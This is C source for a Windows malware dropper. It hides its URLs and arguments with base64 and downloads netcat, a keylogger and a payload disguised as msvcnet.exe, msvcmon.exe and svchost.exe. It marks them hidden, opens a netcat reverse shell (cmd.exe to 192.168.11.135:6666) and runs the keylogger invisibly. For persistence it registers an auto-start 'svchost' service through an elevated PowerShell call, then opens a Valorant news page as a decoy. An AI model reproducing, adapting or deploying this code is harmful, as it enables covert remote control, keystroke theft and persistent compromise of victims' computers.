#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <Shlobj.h>
#include <windows.h>
#include <wininet.h>
#include <stdbool.h>

#include "src/base64.h"


/*
    PSHELL_PATH = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
    encode = QzpcXFdpbmRvd3NcXFN5c3RlbTMyXFxXaW5kb3dzUG93ZXJTaGVsbFxcdjEuMFxccG93ZXJzaGVsbC5leGU=
*/
#define PSHELL_PATH "QzpcXFdpbmRvd3NcXFN5c3RlbTMyXFxXaW5kb3dzUG93ZXJTaGVsbFxcdjEuMFxccG93ZXJzaGVsbC5leGU="


/*
    CHROME_PATH = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"
    encode = QzpcXFByb2dyYW0gRmlsZXNcXEdvb2dsZVxcQ2hyb21lXFxBcHBsaWNhdGlvblxcY2hyb21lLmV4ZQ==
*/
#define CHROME_PATH "QzpcXFByb2dyYW0gRmlsZXNcXEdvb2dsZVxcQ2hyb21lXFxBcHBsaWNhdGlvblxcY2hyb21lLmV4ZQ=="


/*
    NC_URL = "https://raw.githubusercontent.com/belajarqywok/wintrapd/main/msvcnet.exe"
    encode = aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2JlbGFqYXJxeXdvay93aW50cmFwZC9tYWluL21zdmNuZXQuZXhl
*/
#define NC_URL "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2JlbGFqYXJxeXdvay93aW50cmFwZC9tYWluL21zdmNuZXQuZXhl"


/*
    KYLG_URL = "https://raw.githubusercontent.com/belajarqywok/wintrapd/main/build/msvcmon.exe"
    encode   = aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2JlbGFqYXJxeXdvay93aW50cmFwZC9tYWluL2J1aWxkL21zdmNtb24uZXhl
*/
#define KYLG_URL "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2JlbGFqYXJxeXdvay93aW50cmFwZC9tYWluL2J1aWxkL21zdmNtb24uZXhl"


/*
    SVCHOST_URL = "https://raw.githubusercontent.com/belajarqywok/wintrapd/main/build/svchost.exe"
    encode      = aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2JlbGFqYXJxeXdvay93aW50cmFwZC9tYWluL2J1aWxkL3N2Y2hvc3QuZXhl
*/
#define SVCHOST_URL "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2JlbGFqYXJxeXdvay93aW50cmFwZC9tYWluL2J1aWxkL3N2Y2hvc3QuZXhl"


/*
    VALORANT_URL = "https://playvalorant.com/en-us/news/game-updates/"
    encode       = aHR0cHM6Ly9wbGF5dmFsb3JhbnQuY29tL2VuLXVzL25ld3MvZ2FtZS11cGRhdGVzLw==
*/
#define VALORANT_URL "aHR0cHM6Ly9wbGF5dmFsb3JhbnQuY29tL2VuLXVzL25ld3MvZ2FtZS11cGRhdGVzLw=="


/*
    KYLG_PARAMS = "--out-log msvclog"
    encode      = LS1vdXQtbG9nIG1zdmNsb2c=
*/
#define KYLG_PARAMS "LS1vdXQtbG9nIG1zdmNsb2c="


/*
    NC_PARAMS = "-d 192.168.11.135 6666 -e C:\\Windows\\System32\\cmd.exe"
    encode    = LWQgMTkyLjE2OC4xMS4xMzUgNjY2NiAtZSBDOlxcV2luZG93c1xcU3lzdGVtMzJcXGNtZC5leGU=
*/
#define NC_PARAMS "LWQgMTkyLjE2OC4xMS4xMzUgNjY2NiAtZSBDOlxcV2luZG93c1xcU3lzdGVtMzJcXGNtZC5leGU="

void DownloadFile(const char* url, const char* filePath)
{
    HINTERNET hInternet = InternetOpen("Downloader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    HINTERNET hFile = InternetOpenUrl(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);

    if (hFile)
    {
        FILE* file = fopen(filePath, "wb");
        if (file)
        {
            char buffer[2048];
            DWORD bytesRead; 

            do {
                InternetReadFile(hFile, buffer, sizeof(buffer), &bytesRead);
                fwrite(buffer, 1, bytesRead, file);
            } while (bytesRead > 0);

            fclose(file);
        }

        InternetCloseHandle(hFile);
    }

    InternetCloseHandle(hInternet);
}


int main(int argc, char* argv[]) 
{
    DWORD str_len;

    char desktop_path[MAX_PATH];
    SHGetFolderPath(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, desktop_path);

    char current_path[MAX_PATH];
    GetModuleFileName(NULL, current_path, MAX_PATH);


    // nc as msvcnet.exe
    char nc_path[MAX_PATH];
    snprintf(nc_path, MAX_PATH, "%s\\msvcnet.exe", desktop_path);

    // kylg as msvcmon.exe
    char kylg_path[MAX_PATH];
    snprintf(kylg_path, MAX_PATH, "%s\\msvcmon.exe", desktop_path);

    // this as svchost.exe
    char ps_params[256];
    char svchost_path[MAX_PATH];
    snprintf(svchost_path, MAX_PATH, "%s\\svchost.exe", desktop_path);
    sprintf(ps_params, 
        "-Command \"Start-Process cmd.exe -ArgumentList '/c sc create svchost binPath=\"%s\" start=auto && sc start svchost' -Verb RunAs\"",
        svchost_path);

    SetFileAttributes(svchost_path, FILE_ATTRIBUTE_HIDDEN);


    unsigned char *nc_url_decoded = base64_decode(NC_URL, &str_len);
    if ((boolean) nc_url_decoded)
    {
        DownloadFile(nc_url_decoded, nc_path);
        SetFileAttributes(nc_path, FILE_ATTRIBUTE_HIDDEN);

        free(nc_url_decoded);
    }

    unsigned char *kylg_url_decoded = base64_decode(KYLG_URL, &str_len);
    if ((boolean) kylg_url_decoded)
    {
        DownloadFile(kylg_url_decoded, kylg_path);
        SetFileAttributes(kylg_path, FILE_ATTRIBUTE_HIDDEN);

        free(kylg_url_decoded);
    }

    unsigned char *svchost_url_decoded = base64_decode(SVCHOST_URL, &str_len);
    if ((boolean) svchost_url_decoded)
    {
        DownloadFile(svchost_url_decoded, svchost_path);
        SetFileAttributes(svchost_path, FILE_ATTRIBUTE_HIDDEN);

        free(svchost_url_decoded);
    }

    unsigned char *nc_params_decoded = base64_decode(NC_PARAMS, &str_len);
    if ((boolean) nc_params_decoded)
    {
        ShellExecute(NULL, "open", nc_path, NC_PARAMS, NULL, SW_HIDE);

        free(nc_params_decoded);
    }

    unsigned char *kylg_params_decoded = base64_decode(KYLG_PARAMS, &str_len);
    if ((boolean) kylg_params_decoded)
    {
        ShellExecute(NULL, "open", kylg_path, kylg_params_decoded, NULL, SW_HIDE);

        free(kylg_params_decoded);
    }

    unsigned char *pshell_path_decoded = base64_decode(PSHELL_PATH, &str_len);
    if ((boolean) pshell_path_decoded)
    {
        ShellExecute(NULL, "open", pshell_path_decoded, ps_params, NULL, SW_HIDE);

        free(pshell_path_decoded);
    }

    SetFileAttributes(current_path, FILE_ATTRIBUTE_HIDDEN);

    unsigned char *valorant_url_decoded  = base64_decode(VALORANT_URL, &str_len);
    unsigned char *chrome_path_decoded = base64_decode(CHROME_PATH, &str_len);
    if ((boolean) valorant_url_decoded && (boolean) chrome_path_decoded)
    {
        ShellExecute(NULL, "open", chrome_path_decoded,
            valorant_url_decoded, NULL, SW_SHOWNORMAL);

        free(valorant_url_decoded);
        free(chrome_path_decoded);
    }

    return 0;
}
